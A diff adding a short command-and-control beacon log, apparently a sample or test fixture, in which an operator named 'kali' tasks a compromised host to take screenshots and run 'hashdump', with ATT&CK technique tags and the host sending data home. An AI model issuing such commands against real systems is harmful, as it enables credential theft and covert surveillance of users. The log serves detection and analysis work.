@@ -1,0 +1,11 @@
+12/09 08:53:43 UTC [input] <kali> screenshot
+12/09 08:53:43 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+12/09 08:53:43 UTC [checkin] host called home, sent: 199791 bytes
+12/09 08:53:46 UTC [error] screenshot from desktop 0 is empty
+12/09 08:56:12 UTC [input] <kali> hashdump
+12/09 08:56:12 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+12/09 08:56:12 UTC [checkin] host called home, sent: 82553 bytes
+12/09 08:57:17 UTC [input] <kali> screenshot
+12/09 08:57:17 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+12/09 08:58:59 UTC [checkin] host called home, sent: 282367 bytes
+12/09 09:01:39 UTC [error] screenshot from desktop 0 is empty
